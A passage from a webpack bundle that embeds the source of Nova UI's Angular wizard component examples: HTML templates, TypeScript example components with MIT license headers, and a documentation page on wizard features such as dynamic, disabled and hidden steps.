TemplateRef<string>\n    ): void {\n        if ($event) {\n            this.activeDialog = this.dialogService.open(content, {\n                size: "sm",\n            });\n        } else {\n            this.toastService.info({\n                message: $localize`Cancel button clicked!`,\n                title: $localize`Event`,\n            });\n        }\n    }\n\n    public onButtonClick(title: string): void {\n        title === "Leave" ? this.actionDone() : this.actionCanceled();\n        this.activeDialog.close();\n    }\n\n    private actionDone(): void {\n        this.toastService.success({\n            message: $localize`Leave Done!`,\n            title: $localize`Event`,\n        });\n    }\n\n    private actionCanceled(): void {\n        this.toastService.info({\n            message: $localize`Action Canceled!`,\n            title: $localize`Event`,\n        });\n    }\n}\n'},92439:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #step1>\n    <nui-textbox name="hint" value="Example Value"> </nui-textbox>\n    <button\n        nui-button\n        class="m-2"\n        type="button"\n        (click)="increaseHeight()"\n        i18n\n    >\n        Increase height of container\n    </button>\n    <button\n        nui-button\n        class="m-2"\n        type="button"\n        (click)="decreaseHeight()"\n        i18n\n    >\n        Decrease height of container\n    </button>\n</ng-template>\n<ng-template #step2>\n    <nui-checkbox [checked]="true" i18n>Checkbox 1</nui-checkbox>\n    <nui-checkbox [checked]="false" i18n>Checkbox 2</nui-checkbox>\n    <nui-checkbox [checked]="true" i18n>Checkbox 3</nui-checkbox>\n</ng-template>\n<ng-template #step3>\n    <nui-textbox name="hint" value="Step 3 value"> </nui-textbox>\n</ng-template>\n<ng-template #step4>\n    <nui-radio-group name="fruit">\n        <nui-radio value="Banana" i18n> Banana </nui-radio>\n        <nui-radio value="Mango" i18n> Mango </nui-radio>\n        <nui-radio value="Kiwi" i18n> Kiwi </nui-radio>\n    </nui-radio-group>\n</ng-template>\n<nui-wizard\n    #wizardComponent\n    id="nui-demo-wizard-constant-height"\n    [enableScroll]="true"\n    [bodyContainerHeight]="wizardBodyHeight"\n    finishText="Finish"\n    i18n-finishText\n>\n    <nui-wizard-step\n        id="nui-demo-wizard-height-invariable-step"\n        i18n-title\n        title="First"\n        [stepTemplate]="step1"\n    ></nui-wizard-step>\n    <nui-wizard-step\n        i18n-title\n        title="Second"\n        [stepTemplate]="step2"\n    ></nui-wizard-step>\n    <nui-wizard-step\n        i18n-title\n        title="Third"\n        [stepTemplate]="step3"\n    ></nui-wizard-step>\n    <nui-wizard-step\n        i18n-title\n        title="Final"\n        [stepTemplate]="step4"\n    ></nui-wizard-step>\n</nui-wizard>\n'},15940:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-wizard-constant-height-example",\n    templateUrl: "./wizard-constant-height.example.component.html",\n})\nexport class WizardConstantHeightExampleComponent {\n    public wizardBodyHeight: string = "200px";\n\n    public increaseHeight(): void {\n        this.wizardBodyHeight = `${parseInt(this.wizardBodyHeight, 10) + 20}px`;\n    }\n\n    public decreaseHeight(): void {\n        this.wizardBodyHeight = `${parseInt(this.wizardBodyHeight, 10) - 20}px`;\n    }\n}\n'},28534:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #step1> </ng-template>\n<ng-template #step2> </ng-template>\n\n<nui-wizard\n    #wizardComponent\n    id="nui-demo-wizard"\n    [stretchStepLines]="true"\n    finishText="Finish"\n    i18n-finishText\n>\n    <nui-wizard-step\n        id="nui-demo-wizard-step"\n        i18n-title\n        title="This is an excessively long title why would you do it"\n        [stepTemplate]="step1"\n    ></nui-wizard-step>\n    <nui-wizard-step\n        i18n-title\n        title="This title is pretty long too lorem ipsum dolor"\n        [stepTemplate]="step2"\n    ></nui-wizard-step>\n</nui-wizard>\n'},79106:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-wizard-custom-step-line-width",\n    templateUrl: "./wizard-custom-step-line-width.example.component.html",\n})\nexport class WizardCustomStepLineWidthComponent {}\n'},27466:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #step1>\n    <nui-checkbox\n        name="nui-demo-checkbox"\n        i18n-title\n        title="Check box with help text"\n        i18n-hint\n        hint="This is some help text"\n        required="true"\n        [value]="false"\n        i18n\n        >Check box with help text\n    </nui-checkbox>\n    <nui-checkbox\n        name="nui-demo-checkbox-plain"\n        [checked]="true"\n        [value]="false"\n        i18n\n        >Plain checkbox\n    </nui-checkbox>\n</ng-template>\n<ng-template #step2>\n    <nui-checkbox-group\n        name="vegetable"\n        [(values)]="selectedVegetables"\n        (valuesChange)="valuesChanged($event)"\n    >\n        <nui-checkbox\n            *ngFor="let vegetable of vegetables"\n            [value]="vegetable"\n            [checked]="isChecked(vegetable)"\n        >\n            {{ vegetable }}\n        </nui-checkbox>\n    </nui-checkbox-group>\n</ng-template>\n<ng-template #step3>\n    <p i18n>Not visited</p>\n</ng-template>\n<ng-template #step4>\n    <p i18n>Summary</p>\n</ng-template>\n<ng-template #dialogWizard>\n    <nui-dialog-header\n        i18n-title\n        title="Wizard dialog"\n        (closed)="closeDialog()"\n    ></nui-dialog-header>\n    <div class="dialog-body compact-mode">\n        <nui-wizard\n            id="nui-demo-wizard-dialog"\n            (cancel)="closeDialog()"\n            finishText="Finish"\n            i18n-finishText\n        >\n            <nui-wizard-step\n                i18n-title\n                title="Completed"\n                [stepTemplate]="step1"\n            ></nui-wizard-step>\n            <nui-wizard-step\n                i18n-title\n                title="Active"\n                [stepTemplate]="step2"\n            ></nui-wizard-step>\n            <nui-wizard-step\n                i18n-title\n                title="Not visited"\n                [stepTemplate]="step3"\n            ></nui-wizard-step>\n            <nui-wizard-step\n                i18n-title\n                title="Summary"\n                [stepTemplate]="step4"\n            ></nui-wizard-step>\n        </nui-wizard>\n    </div>\n</ng-template>\n<button\n    id="nui-demo-dialog-wizard-btn"\n    nui-button\n    type="button"\n    (click)="openDialog(dialogWizard)"\n    i18n\n>\n    Open dialog wizard\n</button>\n'},41174:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, TemplateRef, ViewChild } from "@angular/core";\n\nimport {\n    DialogService,\n    NuiDialogRef,\n    ToastService,\n    WizardComponent,\n} from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-wizard-dialog-example",\n    templateUrl: "./wizard-dialog.example.component.html",\n})\nexport class WizardDialogExampleComponent {\n    @ViewChild("wizardComponent") wizardComponent: WizardComponent;\n\n    public activeDialog: NuiDialogRef;\n\n    constructor(\n        @Inject(DialogService) private dialogService: DialogService,\n        @Inject(ToastService) private toastService: ToastService\n    ) {}\n\n    public vegetables = [\n        $localize`Cabbage`,\n        $localize`Potato`,\n        $localize`Tomato`,\n        $localize`Carrot`,\n    ];\n    public selectedVegetables = [$localize`Potato`, $localize`Tomato`];\n\n    public isChecked(vegetable: string): boolean {\n        return this.selectedVegetables.indexOf(vegetable) > -1;\n    }\n\n    public valuesChanged(values: any[]): void {\n        this.selectedVegetables = [...values];\n    }\n\n    public openDialog(content: TemplateRef<string>): void {\n        this.activeDialog = this.dialogService.open(content, { size: "lg" });\n    }\n\n    public closeDialog(): void {\n        this.activeDialog.close();\n    }\n}\n'},63678:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-wizard\n    #wizardComponent\n    id="nui-demo-wizard-disable"\n    finishText="Finish"\n    i18n-finishText\n>\n    <nui-wizard-step\n        #wizardStepFirst\n        i18n-title\n        title="Disable next step"\n        [stepTemplate]="step1"\n    ></nui-wizard-step>\n    <nui-wizard-step\n        #wizardStepDisable\n        i18n-title\n        title="Second step"\n        [stepTemplate]="stepDisabled"\n    ></nui-wizard-step>\n</nui-wizard>\n<ng-template #step1>\n    <p i18n>Hi! You can disable next step</p>\n    <div class="btn-group">\n        <button\n            nui-button\n            type="button"\n            id="nui-demo-disable-button"\n            (click)="disableStep()"\n            i18n\n        >\n            Disable next step\n        </button>\n        <button\n            nui-button\n            type="button"\n            id="nui-demo-enable-button"\n            (click)="enableStep()"\n            i18n\n        >\n            Enable next step\n        </button>\n    </div>\n</ng-template>\n<ng-template #stepDisabled>\n    <p i18n>Disabled step</p>\n</ng-template>\n'},93274:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, ViewChild } from "@angular/core";\n\nimport { WizardComponent, WizardStepComponent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-wizard-disabled-example",\n    templateUrl: "./wizard-disabled.example.component.html",\n})\nexport class WizardDisabledExampleComponent {\n    @ViewChild("wizardComponent") wizardComponent: WizardComponent;\n    @ViewChild("wizardStepDisable")\n    wizardStepDisabledComponent: WizardStepComponent;\n\n    public disableStep(): void {\n        this.wizardComponent.disableStep(this.wizardStepDisabledComponent);\n    }\n\n    public enableStep(): void {\n        this.wizardComponent.enableStep(this.wizardStepDisabledComponent);\n    }\n}\n'},55474:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiWizardModule</code>\n    </li>\n</ul>\n<h2>Basic Usage</h2>\n\n<p>\n    To use the wizard component, place a <code>nui-wizard</code> element in your\n    template and include one or more\n    <code\n        ><a href="../components/WizardStepComponent.html" target="_blank"\n            >nui-wizard-step</a\n        ></code\n    >\n    elements as children of the <code>nui-wizard</code> element.\n</p>\n<nui-message type="info" [allowDismiss]="false">\n    <strong>Note:</strong> To specify a label for the finish button of the last\n    step, specify a value for the <code>nui-wizard</code>\'s\n    <code>finishText</code> input.\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="wizard-simple"\n    exampleTitle="Simple wizard"\n>\n    <nui-wizard-simple-example></nui-wizard-simple-example>\n</nui-example-wrapper>\n\n<h2>Wizard with separate step headings</h2>\n<p>\n    You can set separate values for the step name to show in the wizard header\n    and the step content.\n</p>\n<nui-example-wrapper\n    filenamePrefix="wizard-with-separate-step-headings"\n    exampleTitle="Wizard with separate step headings"\n>\n    <nui-wizard-with-separate-step-headings-example></nui-wizard-with-separate-step-headings-example>\n</nui-example-wrapper>\n\n<h2>Usage with a dialog</h2>\n<p>\n    You can pass an existing wizard component as content of the dialog window.\n</p>\n<p>You should insert wizard component in dialog body.</p>\n<nui-example-wrapper\n    filenamePrefix="wizard-dialog"\n    exampleTitle="wizard in dialog"\n>\n    <nui-wizard-dialog-example></nui-wizard-dialog-example>\n</nui-example-wrapper>\n<h2>Busy step</h2>\n<p>You can make your step busy to forbid actions.</p>\n<p>\n    If you want to hide only step content you should pass \'busyConfig\' (look at\n    type \'IBusyConfig\') to \'navigationControl\' method of wizard step to make it\n    work.\n</p>\n<p>\n    If you want to hide all Wizard content you need just wrap Wizard component\n    on busy\n</p>\n<nui-example-wrapper\n    filenamePrefix="wizard-busy"\n    exampleTitle="wizard step busy"\n>\n    <nui-wizard-busy-example></nui-wizard-busy-example>\n</nui-example-wrapper>\n<h2>Validation</h2>\n<p>You can use any custom input validation to wizard step.</p>\n<p>\n    To forbid passing to next step while form is not valid you should pass\n    boolean value to next step\'s property \'stepControl\'.\n</p>\n<nui-example-wrapper\n    filenamePrefix="wizard-validation"\n    exampleTitle="wizard step validation"\n>\n    <nui-wizard-validation-example></nui-wizard-validation-example>\n</nui-example-wrapper>\n<h2>Disabled step</h2>\n<p>You can disable wizard step to forbid user switch to this step.</p>\n<p>\n    To make step disabled you should use wizard method \'disableStep\' and pass\n    wizardStep component to it.\n</p>\n<nui-example-wrapper\n    filenamePrefix="wizard-disabled"\n    exampleTitle="wizard step disable"\n>\n    <nui-wizard-disabled-example></nui-wizard-disabled-example>\n</nui-example-wrapper>\n<h2>Hide/show step</h2>\n<p>You can hide or show wizard steps.</p>\n<p>\n    To make it you should use wizard methods \'hideStep\', \'showStep\' and pass\n    wizardStepComponent to it.\n</p>\n<nui-example-wrapper\n    filenamePrefix="wizard-hide"\n    exampleTitle="wizard step hide/show"\n>\n    <nui-wizard-hide-example></nui-wizard-hide-example>\n</nui-example-wrapper>\n<h2>Adding step dynamically</h2>\n<p>You are able to add wizard steps dynamically</p>\n<p>\n    To make it you should use wizard method \'addStepDynamic\' and pass 2\n    arguments wizardStepComponent and index to insert it in correct place.\n</p>\n<p>\n    <strong>Note:</strong> Angular doesn\'t allow binding to outputs of\n    dynamically created component from template. You can access outputs of\n    <code\n        ><a href="../components/WizardStepComponent.html" target="_blank"\n            >nui-wizard-step</a\n        ></code\n    >\n    directly.<code>addStepDynamic</code> method of Wizard returns you instance\n    of dynamically added step and you can manually subscribe to outputs like\n    <code>enter</code>,<code>exit</code> etc.\n</p>\n<nui-example-wrapper\n    filenamePrefix="wizard-dynamic"\n    exampleTitle="wizard add dynamic step"\n>\n    <nui-wizard-dynamic-example></nui-wizard-dynamic-example>\n</nui-example-wrapper>\n<h2>Remove step dynamically</h2>\n<p>You are able to remove wizard steps dynamically</p>\n<p>To make it you should use wizard method \'removeStep\' and pass index</p>\n<p><strong>Note:</strong> Your couldn\'t remove first (0 index) step</p>\n<nui-example-wrapper\n    filenamePrefix="wizard-dynamic-remove"\n    exampleTitle="wizard remove dynamic step"\n>\n    <nui-wizard-dynamic-remove-example></nui-wizard-dynamic-remove-example>\n</nui-example-wrapper>\n<h2>Additional button in footer example</h2>\n<p>You are able to provide additional button in footer of wizard.</p>\n<p>\n    To do it you should provide nui-button as a content of nui-wizard component.\n</p>\n<nui-example-wrapper\n    filenamePrefix="wizard-additional-button"\n    exampleTitle="wizard additional button"\n>\n    <nui-wizard-additional-button-example></nui-wizard-additional-button-example>\n</nui-example-wrapper>\n<h2>Confirmation dialog</h2>\n<p>\n    To implement confirmation dialog you should use method \'confirm\' from dialog\n    service and call it from outputs such as \'onCancel\' or \'onFinish\'.\n</p>\n<p>\n    By default UX suggestion \'onCancel\' output sends boolean event which is\n    false when user is on first step.\n</p>\n<p>\n    On this example confirmation dialog represents default UX behavior and does\n    not appear on first wizard step.\n</p>\n<nui-example-wrapper\n    filenamePrefix="wizard-confirmation-dialog"\n    exampleTitle="wizard confirmation dialog"\n>\n    <nui-wizard-confirmation-dialog-example></nui-wizard-confirmation-dialog-example>\n</nui-example-wrapper>\n<h2>Constant height</h2>\n<p>\n    To make the height of the wizard constant for all steps and have the body of\n    a step scroll vertically if it extends beyond the fixed height, set the\n    <code>enableScroll</code> input to true and set the desired height of the\n    wizard body container using the <code>bodyContainerHeight</code> input.\n</p>\n<p>\n    Supported values of <code>bodyContainerHeight</code> are the same as in CSS.\n    For example: 100px, 5vh, etc.\n</p>\n<nui-example-wrapper\n    filenamePrefix="wizard-constant-height"\n    exampleTitle="wizard constant height"\n>\n    <nui-wizard-constant-height-example></nui-wizard-constant-height-example>\n</nui-example-wrapper>\n<h2>Stretched steps line width</h2>\n<p>\n    To make the width of the steps line stretch according to the largest of step\n    labels, use <code>stretchStepLines</code> input. With it set to\n    <code>true</code>, wizard will calculate the width of the largest label and\n    adjust all the lines so the labels don\'t overflow.\n</p>\n<nui-example-wrapper\n    filenamePrefix="wizard-custom-step-line-width"\n    exampleTitle="wizard custom steps label width"\n>\n    <nui-wizard-custom-step-line-width></nui-wizard-custom-step-line-width>\n</nui-example-wrapper>\n\n<h2>Wizard steps combination</h2>\n<p>\n    You can provide a combination of static and dynamic steps of the wizard. See\n    example below:\n</p>\n<nui-example-wrapper\n    filenamePrefix="wizard-steps"\n    exampleTitle="wizard steps combination"\n>\n    <nui-wizard-steps-example></nui-wizard-steps-example>\n</nui-example-wrapper>\n\n<h2>Wizard reset step</h2>\n<p>\n    You can reset step by calling wizard \'resetStep\' method. Note that next\n    steps will be reset in case they was visited\n</p>\n<nui-example-wrapper\n    filenamePrefix="wizard-reset-step"\n    exampleTitle="wizard reset step"\n>\n    <nui-wizard-reset-step-example></nui-wizard-reset-step-example>\n</nui-example-wrapper>\n'},67822:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-wizard-example",\n    templateUrl: "./wizard-docs.example.component.html",\n})\nexport class WizardExampleComponent {}\n'},62086:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-wizard\n    #wizardComponent\n    id="nui-demo-wizard-remove-dynamic"\n    finishText="Finish"\n    (selectionChange)="select($event)"\n    i18n-finishText\n>\n    <nui-wizard-step\n        #wizardStepAdd\n        i18n-title\n        title="Add step dynamically"\n        [stepTemplate]="step1"\n    ></nui-wizard-step>\n</nui-wizard>\n<nui-wizard-step\n    #dynamicStep\n    [title]="\'Dynamic\'"\n    [stepTemplate]="dynamicStepTemplate"\n></nui-wizard-step>\n<ng-template #step1>\n    <p i18n>Hi! You can add next step dynamically</p>\n    <button nui-button type="button" (click)="addStep()" i18n>\n        Add dynamic step\n    </button>\n</ng-template>\n<ng-template #dynamicStepTemplate>\n    <p i18n>Hi! I\'m dynamic step!</p>\n</ng-template>\n\n<div class="d-flex">\n    <div class="">\n        <span class="nui-textbox--bold" [ngStyle]="{ \'font-weight\': \'bold\' }"\n            >Step index to remove</span\n        >\n        <br />\n        <nui-textbox-number [minValue]="1" #number></nui-textbox-number>\n    </div>\n    <button\n        class="ml-3 h-25 align-self-end"\n        displayStyle="destructive"\n        nui-button\n        type="button"\n        (click)="removeStep(+number.value)"\n        i18n\n    >\n        Remove step dynamically\n    </button>\n</div>\n'},99890:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnDestroy, ViewChild } from "@angular/core";\nimport { Subject } from "rxjs";\nimport { takeUntil } from "rxjs/operators";\n\nimport {\n    IWizardSelectionEvent,\n    WizardComponent,\n    WizardStepComponent,\n} from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-wizard-dynamic-remove-example",\n    templateUrl: "./wizard-dynamic-remove.example.component.html",\n})\nexport class WizardDynamicRemoveExampleComponent implements OnDestroy {\n    @ViewChild("wizardComponent") wizardComponent: WizardComponent;\n    @ViewChild("dynamicStep") dynamicStep: WizardStepComponent;\n\n    public selectedIndex: number;\n\n    private readonly destroy$ = new Subject<void>();\n\n    public select(event: IWizardSelectionEvent): void {\n        this.selectedIndex = event.selectedIndex;\n    }\n\n    public addStep(): void {\n        const index = this.selectedIndex + 1;\n        const step = this.wizardComponent.addStepDynamic(\n            this.dynamicStep,\n            index\n        );\n\n        step.enter\n            ?.pipe(takeUntil(this.destroy$))\n            .subscribe(() =>\n                console.log(\n                    `Enter event has been emitted from WizardStepComponent`\n                )\n            );\n\n        step.exit\n            ?.pipe(takeUntil(this.destroy$))\n            .subscribe(() =>\n                console.log(\n                    `Exit event has been emitted from WizardStepComponent`\n                )\n            );\n    }\n\n    public removeStep(index: number): void {\n        this.wizardComponent.removeStep(index);\n    }\n\n    public ngOnDestroy(): void {\n        this.destroy$.next();\n        this.destroy$.complete();\n    }\n}\n'},91018:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-wizard\n    #wizardComponent\n    id="nui-demo-wizard-add-dynamic"\n    (selectionChange)="select($event)"\n    finishText="Finish"\n    i18n-finishText\n>\n    <nui-wizard-step\n        #wizardStepAdd\n        i18n-title\n        title="Add step dynamically"\n        [stepTemplate]="step1"\n    ></nui-wizard-step>\n</nui-wizard>\n<nui-wizard-step\n    #dynamicStep\n    [title]="\'Dynamic\'"\n    [stepTemplate]="dynamicStepTemplate"\n></nui-wizard-step>\n<ng-template #step1>\n    <p i18n>Hi! You can add next step dynamically</p>\n    <button\n        nui-button\n        type="button"\n        id="nui-demo-dynamic-button"\n        (click)="addStep()"\n        i18n\n    >\n        Add dynamic step\n    </button>\n</ng-template>\n<ng-template #dynamicStepTemplate>\n    <p i18n>Hi! I\'m dynamic step!</p>\n</ng-template>\n'},9846:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnDestroy, ViewChild } from "@angular/core";\nimport { Subject } from "rxjs";\nimport { takeUntil } from "rxjs/operators";\n\nimport {\n    IWizardSelectionEvent,\n    WizardComponent,\n    WizardStepComponent,\n} from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-wizard-dynamic-example",\n    templateUrl: "./wizard-dynamic.example.component.html",\n})\nexport class WizardDynamicExampleComponent implements OnDestroy {\n    @ViewChild("wizardComponent") wizardComponent: WizardComponent;\n    @ViewChild("dynamicStep") dynamicStep: WizardStepComponent;\n\n    public selectedIndex: number;\n\n    private onDestroy$ = new Subject<void>();\n\n    public select(event: IWizardSelectionEvent): void {\n        this.selectedIndex = event.selectedIndex;\n    }\n\n    public addStep(): void {\n        // addStepDynamic returns an instance of WizardStepComponent that was dynamically added\n        const step = this.wizardComponent.addStepDynamic(\n            this.dynamicStep,\n            this.selectedIndex + 1\n        );\n\n        // subscribe to entering the dynamic step and push it to subscriptions array\n        step.enter?.pipe(takeUntil(this.onDestroy$)).subscribe(() => {\n            console.log(\n                "Enter event has been emitted from WizardStepComponent"\n            );\n        });\n\n        // subscribe to exiting the dynamic step and push it to subscriptions array\n        step.exit?.pipe(takeUntil(this.onDestroy$)).subscribe(() => {\n            console.log("Exit event has been emitted from WizardStepComponent");\n        });\n    }\n\n    public ngOnDestroy(): void {\n        this.onDestroy$.next();\n        this.onDestroy$.complete();\n    }\n}\n'},66473:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-wizard\n    #wizardComponent\n    id="nui-demo-wizard-hide-show"\n    finishText="Finish"\n    i18n-finishText\n>\n    <nui-wizard-step\n        #wizardStepFirst\n        i18n-title\n        title="Hide show next step"\n        [stepTemplate]="step1"\n    ></nui-wizard-step>\n    <nui-wizard-step\n        #wizardStepHidden\n        i18n-title\n        title="Second step"\n        [stepTemplate]="stepHidden"\n    ></nui-wizard-step>\n</nui-wizard>\n<ng-template #step1>\n    <p i18n>Hi! You can 